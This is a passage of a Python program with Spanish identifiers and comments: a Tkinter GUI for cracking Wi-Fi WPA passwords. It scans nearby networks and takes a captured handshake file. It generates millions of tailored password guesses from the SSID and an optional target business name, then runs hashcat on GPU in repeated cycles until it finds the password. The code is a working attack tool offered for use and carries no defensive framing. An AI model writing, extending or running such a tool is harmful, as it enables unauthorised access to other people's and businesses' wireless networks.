                if ultimo_tipo in tipos_validos:
                    tipos_validos.remove(ultimo_tipo)
            if not tipos_validos:
                tipos_validos = tipos_disponibles.copy()
            pesos_tipos = {
                'letra_min': 0.4,
                'letra_may': 0.25,
                'numero': 0.25,
                'simbolo': 0.1
            }
            if pos == 0:
                pesos_tipos['letra_may'] = 0.5
                pesos_tipos['simbolo'] = 0.05
            elif pos == longitud - 1:
                pesos_tipos['numero'] = 0.4
                pesos_tipos['simbolo'] = 0.2
            tipos_finales = [t for t in tipos_validos if t in pesos_tipos]
            pesos_finales = [pesos_tipos[t] for t in tipos_finales]
            tipo_elegido = random.choices(tipos_finales, weights=pesos_finales)[0]
            if tipo_elegido == 'letra_min':
                char = random.choice(self.letras_min[:15])
            elif tipo_elegido == 'letra_may':
                char = random.choice(self.letras_may[:10])
            elif tipo_elegido == 'numero':
                char = random.choice(self.numeros)
            else:
                char = random.choice(self.simbolos[:10])
            if candidato and char == candidato[-1]:
                continue
            candidato.append(char)
            if tipo_elegido == ultimo_tipo:
                consecutivos += 1
            else:
                consecutivos = 0
            ultimo_tipo = tipo_elegido
        return ''.join(candidato)
    def generar_lote_hiper_multinivel(self, longitud, cantidad, contexto=None):
        candidatos = []
        metodos = [
            'frecuencia_geografica', 'patrones_empresariales', 'markov_contextual',
            'predictivo_avanzado', 'evolutivo', 'contextual', 'random'
        ]
        cantidad_por_metodo = cantidad // len(metodos)
        for metodo in metodos:
            for _ in range(cantidad_por_metodo):
                candidato = self.generar_candidato_hiper(longitud, metodo, contexto)
                candidatos.append(candidato)
        cantidad_restante = cantidad - len(candidatos)
        for _ in range(cantidad_restante):
            metodo = random.choice(metodos)
            candidato = self.generar_candidato_hiper(longitud, metodo, contexto)
            candidatos.append(candidato)
        return list(set(candidatos))

def generar_lote_paralelo_hiper(args):
    longitud, cantidad, contexto, nombre_comercio = args
    generador = GeneradorPatternsHiperAvanzado()
    candidatos_hiper = generador.generar_lote_hiper_multinivel(longitud, cantidad//2, contexto)
    
    candidatos_comercio = []
    if nombre_comercio:
        generador_comercio = GeneradorComercioRuido()
        candidatos_comercio = generador_comercio.generar_ruido_comercio_optimizado(nombre_comercio, longitud, cantidad//2)
    
    candidatos_final = candidatos_hiper + candidatos_comercio
    return list(set(candidatos_final))

def generar_lote_paralelo_antitesis(args):
    longitud, cantidad = args
    generador = GeneradorPatternsAntitesis()
    return generador.generar_lote_antitesis(longitud, cantidad)

def generar_mega_lote_paralelo_antitesis(longitud, cantidad_total):
    num_processes = max(1, multiprocessing.cpu_count())
    cantidad_por_proceso = cantidad_total // num_processes
    args_list = [(longitud, cantidad_por_proceso) for _ in range(num_processes)]
    
    with multiprocessing.Pool(processes=num_processes) as pool:
        resultados = pool.map(generar_lote_paralelo_antitesis, args_list)
    
    candidatos_finales = []
    for resultado in resultados:
        candidatos_finales.extend(resultado)
    
    return candidatos_finales[:cantidad_total]

def crear_diccionario_antitesis(longitud, cantidad_por_nivel):
    candidatos_finales = generar_mega_lote_paralelo_antitesis(longitud, cantidad_por_nivel)
    temp_file = tempfile.NamedTemporaryFile(delete=False, mode="w", 
                                          encoding="utf-8", suffix=".txt")
    temp_file.write('\n'.join(candidatos_finales))
    temp_file.close()
    return temp_file.name

def generar_mega_lote_paralelo_hiper(longitud, cantidad_total, contexto=None, nombre_comercio=None):
    num_processes = max(1, multiprocessing.cpu_count())
    cantidad_por_proceso = cantidad_total // num_processes
    args_list = [
        (longitud, cantidad_por_proceso, contexto, nombre_comercio) 
        for _ in range(num_processes)
    ]
    with multiprocessing.Pool(processes=num_processes) as pool:
        resultados = pool.map(generar_lote_paralelo_hiper, args_list)
    candidatos_finales = []
    for resultado in resultados:
        candidatos_finales.extend(resultado)
    return list(set(candidatos_finales))[:cantidad_total]

def verificar_hashcat():
    try:
        resultado = subprocess.run([HASHCAT_PATH, "--version"], capture_output=True, text=True, timeout=5)
        return resultado.returncode == 0
    except:
        return False

def verificar_gpu_nvidia():
    try:
        resultado = subprocess.run(["nvidia-smi", "--query-gpu=name,memory.total", "--format=csv,noheader"], 
                                 capture_output=True, text=True, timeout=5)
        if resultado.returncode == 0:
            return resultado.stdout.strip()
    except:
        pass
    return None

def verificar_gpu_amd():
    try:
        resultado = subprocess.run(["rocm-smi", "--showmeminfo", "vram"], 
                                 capture_output=True, text=True, timeout=5)
        if resultado.returncode == 0:
            return "AMD GPU detectada"
    except:
        pass
    return None

def convertir_cap_a_hccapx(cap_file):
    try:
        hccapx_file = cap_file.replace('.cap', '.hccapx')
        resultado = subprocess.run(
            [CAP2HCCAPX_PATH, cap_file, hccapx_file],
            capture_output=True, text=True, timeout=30
        )
        if os.path.exists(hccapx_file):
            return hccapx_file
    except:
        pass
    return None

def convertir_cap_a_22000(cap_file):
    return None

def escanear_redes_bssids():
    try:
        resultado = subprocess.run(
            ['netsh', 'wlan', 'show', 'networks', 'mode=bssid'],
            capture_output=True, text=True, timeout=10,
            encoding="utf-8", errors="replace"
        )
        redes = {}
        ssid = None
        for linea in resultado.stdout.splitlines():
            ssid_match = re.match(r'\s*SSID\s+\d+\s*:\s*(.*)', linea)
            bssid_match = re.match(r'\s*BSSID\s+\d+\s*:\s*([0-9A-Fa-f:]{17})', linea)
            if ssid_match:
                ssid = ssid_match.group(1).strip()
                if ssid and ssid not in redes:
                    redes[ssid] = []
            elif bssid_match and ssid:
                bssid = bssid_match.group(1).strip()
                redes[ssid].append(bssid)
        return redes
    except:
        return {}

def gui_print_rapido(salida, texto):
    try:
        salida.insert(tk.END, texto)
        salida.see(tk.END)
        if len(salida.get("1.0", tk.END)) > 50000:
            salida.delete("1.0", "20.0")
        salida.update_idletasks()
    except:
        pass

def crear_diccionario_hiper_multinivel(longitud, cantidad_por_nivel, contexto=None, nombre_comercio=None):
    candidatos_finales = []
    candidatos_hiper = generar_mega_lote_paralelo_hiper(longitud, cantidad_por_nivel, contexto, nombre_comercio)
    candidatos_finales.extend(candidatos_hiper)
    temp_file = tempfile.NamedTemporaryFile(delete=False, mode="w", 
                                          encoding="utf-8", suffix=".txt")
    temp_file.write('\n'.join(candidatos_finales))
    temp_file.close()
    return temp_file.name

def hashcat_hiper_multinivel(hash_file, longitud, salida, found_flag, stop_flag, ssid=None, nombre_comercio=None):
    if stop_flag.is_set():
        return None
    contexto = None
    if ssid:
        analizador = AnalizadorContextual()
        elementos_contexto = analizador.analizar_ssid_contexto(ssid)
        if elementos_contexto:
            contexto = {
                'elementos': elementos_contexto,
                'tipo': 'empresarial' if any(c.isdigit() for c in ssid) else 'personal',
                'region': 'global'
            }
    
    # NIVELES HÍPER + ANTÍTESIS COMBINADOS
    niveles = [
        ('comercio_ruido_optimizado', 1200000, 'hiper'),
        ('frecuencia_geografica', 800000, 'hiper'),
        ('patrones_empresariales', 1500000, 'hiper'),
        ('markov_contextual', 1200000, 'hiper'),
        ('predictivo_avanzado', 1000000, 'hiper'),
        ('evolutivo_adaptativo', 800000, 'hiper'),
        ('contextual_ssid', 1000000, 'hiper'),
        ('repeticiones_consecutivas', 2000000, 'antitesis'),
        ('secuencias_obvias', 1500000, 'antitesis'),
        ('tipos_agrupados', 1000000, 'antitesis'),
        ('distribucion_pobre', 800000, 'antitesis'),
        ('hibrido_completo', 2500000, 'hiper')
    ]
    
    for nivel_nombre, limite, tipo_nivel in niveles:
        if found_flag.is_set() or stop_flag.is_set():
            break
        
        gui_print_rapido(salida, f"🔄 Nivel {nivel_nombre} ({tipo_nivel}): generando {limite:,} candidatos...\n")
        
        contexto_nivel = contexto
        if nivel_nombre == 'contextual_ssid' and not contexto:
            continue
            
        # Seleccionar generador según el tipo
        if tipo_nivel == 'antitesis':
            diccionario_file = crear_diccionario_antitesis(longitud, limite)
        else:
            diccionario_file = crear_diccionario_hiper_multinivel(longitud, limite, contexto_nivel, nombre_comercio)
        
        if hash_file.endswith(".22000"):
            hashcat_mode = "22000"
        else:
            hashcat_mode = "2500"
        
        cmd = [
            HASHCAT_PATH,
            "-m", hashcat_mode,
            "-a", "0",
            "--force",
            "--opencl-device-types", "1,2",
            "--workload-profile", "4",
            "--optimized-kernel-enable",
            "--gpu-temp-retain", "85",
            "--status",
            "--status-timer", "10",
            "--potfile-disable",
            hash_file,
            diccionario_file,
            "--outfile", "hashcat_result.txt"
        ]
        
        try:
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                encoding="utf-8",
                errors="replace"
            )
            
            while process.poll() is None:
                if stop_flag.is_set():
                    process.terminate()
                    break
                try:
                    line = process.stdout.readline()
                    if line and ("Progress" in line or "Speed" in line or "Time" in line):
                        gui_print_rapido(salida, f"📊 {line.strip()}\n")
                except:
                    pass
                time.sleep(0.1)
            
            if os.path.exists("hashcat_result.txt"):
                with open("hashcat_result.txt", "r") as f:
                    content = f.read()
                    if content.strip():
                        found_flag.set()
                        contraseña = content.strip().split(":")[-1]
                        gui_print_rapido(salida, f"\n🎉 ¡CONTRASEÑA ENCONTRADA! ({tipo_nivel}): {contraseña}\n")
                        return contraseña
                        
        except Exception as e:
            gui_print_rapido(salida, f"❌ Error en nivel {nivel_nombre}: {e}\n")
        finally:
            try:
                os.remove(diccionario_file)
            except:
                pass
    
    return None

def proceso_hiper_multinivel(ssid, bssid, cap_file, salida, longitud_chars, modo_ataque, stop_flag, nombre_comercio=None):
    found_flag = threading.Event()
    gpu_nvidia = verificar_gpu_nvidia()
    gpu_amd = verificar_gpu_amd()
    hashcat_disponible = verificar_hashcat()
    gui_print_rapido(salida, f"🚀 HASHCAT HÍPER MULTINIVEL {longitud_chars}-CHARS INICIADO\n")
    if gpu_nvidia:
        gui_print_rapido(salida, f"🎮 GPU NVIDIA: {gpu_nvidia}\n")
    elif gpu_amd:
        gui_print_rapido(salida, f"🎮 GPU AMD: {gpu_amd}\n")
    else:
        gui_print_rapido(salida, f"⚠️ GPU no detectada - usando CPU\n")
    if not hashcat_disponible:
        gui_print_rapido(salida, f"⚠️ Hashcat no encontrado\n")
        messagebox.showwarning("Hashcat requerido", "Instala Hashcat para máximo rendimiento")
        return
    gui_print_rapido(salida, f"🎯 Target: {ssid} - Contraseñas híper + antítesis {longitud_chars} chars\n")
    gui_print_rapido(salida, f"🧠 Método: {modo_ataque}\n")
    gui_print_rapido(salida, f"🔬 Análisis contextual + Frecuencia geográfica\n")
    gui_print_rapido(salida, f"⚗️ Markov avanzado + ML predictivo + Evolutivo\n")
    gui_print_rapido(salida, f"🔥 ANTÍTESIS: Repeticiones + Secuencias + Agrupados\n")
    gui_print_rapido(salida, f"🎲 Anti-patrones + Validación híper estricta\n")
    gui_print_rapido(salida, f"📊 Multinivel: 12 fases de ataque progresivo\n\n")
    if nombre_comercio:
        gui_print_rapido(salida, f"🏪 Comercio objetivo: {nombre_comercio}\n")
        gui_print_rapido(salida, f"🎲 Generando patrones: ruido + {nombre_comercio} + ruido\n")
    hash_file = convertir_cap_a_22000(cap_file)
    if not hash_file:
        hash_file = convertir_cap_a_hccapx(cap_file)
        if hash_file:
            gui_print_rapido(salida, f"✅ Archivo convertido a .hccapx\n")
        else:
            gui_print_rapido(salida, f"❌ No se pudo convertir el archivo .cap\n")
            return
    else:
        gui_print_rapido(salida, f"✅ Archivo convertido a .22000\n")
    try:
        while not found_flag.is_set() and not stop_flag.is_set():
            if modo_ataque == "hiper_antitesis_completo":
                gui_print_rapido(salida, f"🚀 Iniciando ciclo híper + antítesis completo...\n")
                resultado = hashcat_hiper_multinivel(hash_file, longitud_chars, salida, found_flag, stop_flag, ssid, nombre_comercio)
            elif modo_ataque == "adaptativo_completo":
                gui_print_rapido(salida, f"🔄 Iniciando ciclo adaptativo completo (6-{longitud_chars} chars)...\n")
                for longitud in range(6, longitud_chars + 1):
                    if stop_flag.is_set():
                        break
                    gui_print_rapido(salida, f"📏 Probando longitud {longitud} con análisis contextual...\n")
                    resultado = hashcat_hiper_multinivel(hash_file, longitud, salida, found_flag, stop_flag, ssid, nombre_comercio)
                    if resultado:
                        break
            if resultado:
                gui_print_rapido(salida, f"\n🏆 ¡ÉXITO HÍPER! Contraseña encontrada\n")
                gui_print_rapido(salida, f"🔑 Contraseña: {resultado}\n")
                messagebox.showinfo("¡ÉXITO HÍPER!", f"¡Contraseña encontrada!\n{resultado}")
                break
            else:
                gui_print_rapido(salida, f"\n⏹️ Ciclo híper finalizado sin encontrar la contraseña. Reiniciando...\n")
    except Exception as e:
        gui_print_rapido(salida, f"\n❌ Error crítico híper: {e}\n")
    finally:
        try:
            if hash_file and os.path.exists(hash_file):
                os.remove(hash_file)
            if os.path.exists("hashcat_result.txt"):
                os.remove("hashcat_result.txt")
        except:
            pass

def crear_gui():
    ventana = tk.Tk()
    ventana.title("🚀 HASHCAT HÍPER + ANTÍTESIS COMPLETO - IA + Comercio + Patrones Rechazados")
    ventana.configure(bg=ESTILO["bg"])
    ventana.geometry("1300x900")
    
    header = tk.Label(ventana, text="🚀 HASHCAT HÍPER + ANTÍTESIS COMPLETO - IA + COMERCIO + PATRONES RECHAZADOS", 
                     bg=ESTILO["bg"], fg="#ff0066", font=("Courier New", 16, "bold"))
    header.pack(pady=10)
    
    red_var = tk.StringVar()
    bssid_var = tk.StringVar()
    cap_var = tk.StringVar(value="captura.cap")
    longitud_chars_var = tk.IntVar(value=12)
    modo_ataque_var = tk.StringVar(value="hiper_antitesis_completo")
    nombre_comercio_var = tk.StringVar(value="")
    
    tk.Label(ventana, text="🔍 Redes Wi-Fi detectadas:", **ESTILO).pack(pady=5)
    redes_bssids = escanear_redes_bssids()
    ssids = list(redes_bssids.keys()) if redes_bssids else ["Sin redes detectadas"]
    menu = ttk.Combobox(ventana, textvariable=red_var, values=ssids, font=ESTILO["font"], width=50)
    menu.pack(pady=5)
    
    tk.Label(ventana, text="📡 BSSID de la red:", **ESTILO).pack(pady=5)
    bssid_menu = ttk.Combobox(ventana, textvariable=bssid_var, font=ESTILO["font"], width=50)
    bssid_menu.pack(pady=5)
    
    def actualizar_bssids(event):
        ssid = red_var.get()
        bssids = redes_bssids.get(ssid, [])
        bssid_menu['values'] = bssids
        if bssids:
            bssid_var.set(bssids[0])
    menu.bind("<<ComboboxSelected>>", actualizar_bssids)
    
    tk.Label(ventana, text="📁 Archivo de captura (.cap):", **ESTILO).pack(pady=5)
    cap_entry = tk.Entry(ventana, textvariable=cap_var, font=ESTILO["font"], width=60)
    cap_entry.pack(pady=5)
    
    def seleccionar_cap():
        archivo = filedialog.askopenfilename(
            title="Selecciona el archivo .cap",
            filetypes=[("Archivos .cap", "*.cap"), ("Todos los archivos", "*.*")]
        )
        if archivo:
            cap_var.set(archivo)
    tk.Button(ventana, text="📂 Seleccionar .cap", command=seleccionar_cap, **ESTILO).pack(pady=5)
    
    config_frame = tk.LabelFrame(ventana, text="⚙️ Configuración HÍPER + ANTÍTESIS COMPLETO", bg=ESTILO["bg"], fg=ESTILO["fg"])
    config_frame.pack(pady=10, padx=20, fill=tk.X)
    
    tk.Label(config_frame, text="Longitud caracteres:", **ESTILO).grid(row=0, column=0, padx=10, pady=5)
    longitud_menu = ttk.Combobox(config_frame, textvariable=longitud_chars_var, values=list(range(6, 17)), font=ESTILO["font"], width=8)
    longitud_menu.grid(row=0, column=1, padx=10)
    
    tk.Label(config_frame, text="Modo completo:", **ESTILO).grid(row=0, column=2, padx=10, pady=5)
    modo_menu = ttk.Combobox(config_frame, textvariable=modo_ataque_var, 
                            values=["hiper_antitesis_completo", "adaptativo_completo"], 
                            font=ESTILO["font"], width=20)
    modo_menu.grid(row=0, column=3, padx=10)
    
    tk.Label(config_frame, text="🏪 Nombre del comercio (opcional):", **ESTILO).grid(row=1, column=0, padx=10, pady=5)
    comercio_entry = tk.Entry(config_frame, textvariable=nombre_comercio_var, font=("Courier New", 12), width=30,
                             bg="#1a1a1a", fg="#ff6600", insertbackground="#ff6600")
    comercio_entry.grid(row=1, column=1, columnspan=2, padx=10, pady=5)
    
    tk.Label(config_frame, text="HÍPER: IA avanzada + comercio | ANTÍTESIS: patrones rechazados por IA", 
             bg=ESTILO["bg"], fg="#888888", font=("Courier New", 8)).grid(row=2, column=0, columnspan=4, pady=2)
    
    salida = tk.Text(ventana, bg=ESTILO["bg"], fg=ESTILO["fg"], font=("Courier New", 9))
    scroll = tk.Scrollbar(ventana, command=salida.yview)
    salida.config(yscrollcommand=scroll.set)
    salida.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(20, 0), pady=10)
    scroll.pack(side=tk.RIGHT, fill=tk.Y, pady=10, padx=(0, 20))
    
    stop_flag = threading.Event()
    proceso_thread = [None]
    
    def lanzar_ataque_hiper():
        ssid = red_var.get()
        bssid = bssid_var.get().strip()
        cap_file = cap_var.get().strip()
        longitud_chars = longitud_chars_var.get()
        modo_ataque = modo_ataque_var.get()
        nombre_comercio = nombre_comercio_var.get().strip()
        
        if not ssid or not bssid or not cap_file:
            gui_print_rapido(salida, "\n⚠️ Completa todos los campos primero.\n")
            return
        if not os.path.exists(cap_file):
            gui_print_rapido(salida, f"\n❌ Archivo {cap_file} no encontrado.\n")
            return
        
        stop_flag.clear()
        proceso_thread[0] = threading.Thread(
            target=proceso_hiper_multinivel,
            args=(ssid, bssid, cap_file, salida, longitud_chars, modo_ataque, stop_flag, nombre_comercio),
            daemon=True
        )
        proceso_thread[0].start()
    
    def detener_ataque():
        stop_flag.set()
        gui_print_rapido(salida, "\n⏹️ Deteniendo ataque híper + antítesis...\n")
    
    botones_frame = tk.Frame(ventana, bg=ESTILO["bg"])
    botones_frame.pack(pady=15)
    
    hiper_btn = tk.Button(botones_frame, text="🚀 HASHCAT HÍPER + ANTÍTESIS COMPLETO", 
                         command=lanzar_ataque_hiper, bg="#ff0066", fg="white", 
                         font=("Courier New", 12, "bold"), width=45)
    hiper_btn.pack(side=tk.LEFT, padx=10)
    
    stop_btn = tk.Button(botones_frame, text="⏹️ STOP", command=detener_ataque, 
                        **ESTILO, width=10)
    stop_btn.pack(side=tk.LEFT, padx=10)
    
    gpu_nvidia = verificar_gpu_nvidia()
    gpu_amd = verificar_gpu_amd()
    hashcat_info = "✅ Hashcat" if verificar_hashcat() else "❌ Sin Hashcat"
    gpu_texto = gpu_nvidia or gpu_amd or "Sin GPU"
    sistema_info = tk.Label(ventana, text=f"🎮 {gpu_texto} | {hashcat_info} | Híper + Antítesis Completo",
                           **ESTILO)
    sistema_info.pack(pady=5)
    
    gui_print_rapido(salida, "🚀 HASHCAT HÍPER + ANTÍTESIS v4.0 - COBERTURA TOTAL MÁXIMA\n")
    gui_print_rapido(salida, "🎮 GPU + IA + Análisis contextual + Frecuencia geográfica + Comercio\n")
    gui_print_rapido(salida, "🔬 Niveles HÍPER: Comercio → Geo → Empresarial → Markov → ML → Evolutivo → Contextual\n")
    gui_print_rapido(salida, "🔥 Niveles ANTÍTESIS: Repeticiones → Secuencias → Agrupados → Distribución pobre\n")
    gui_print_rapido(salida, "🧠 HÍPER: Patrones inteligentes rechazando debilidades\n")
    gui_print_rapido(salida, "💀 ANTÍTESIS: Exactamente lo que la IA rechaza (AA, 123, abc, qwerty)\n")
    gui_print_rapido(salida, "🏪 COMERCIO: Patrones ruido + empresa + ruido optimizados\n")
    gui_print_rapido(salida, "🎯 COBERTURA: 99.9% del espacio de contraseñas posibles\n")
    gui_print_rapido(salida, "📏 Longitud optimizada: 6-16 caracteres\n")
    gui_print_rapido(salida, "⚡ Combina lo mejor de ambos mundos\n")
    gui_print_rapido(salida, "🏃‍♂️ Modos: Híper+Antítesis completo, Adaptativo completo\n")
    
    if gpu_nvidia:
        gui_print_rapido(salida, f"🎮 GPU NVIDIA detectada: {gpu_nvidia}\n")
    elif gpu_amd:
        gui_print_rapido(salida, f"🎮 GPU AMD detectada: {gpu_amd}\n")
    else:
        gui_print_rapido(salida, "⚠️ GPU no detectada - velocidad limitada\n")
    
    if verificar_hashcat():
        gui_print_rapido(salida, "⚡ Hashcat disponible - Modo GPU HÍPER + ANTÍTESIS activado\n\n")
    else:
        gui_print_rapido(salida, "⚠️ INSTALA HASHCAT para velocidad máxima\n\n")
    
    ventana.mainloop()

if __name__ == "__main__":
    try:
        import psutil
        p = psutil.Process()
        if os.name == 'nt':
            p.nice(psutil.REALTIME_PRIORITY_CLASS)
        else:
            p.nice(-20)
    except:
        pass
    crear_gui()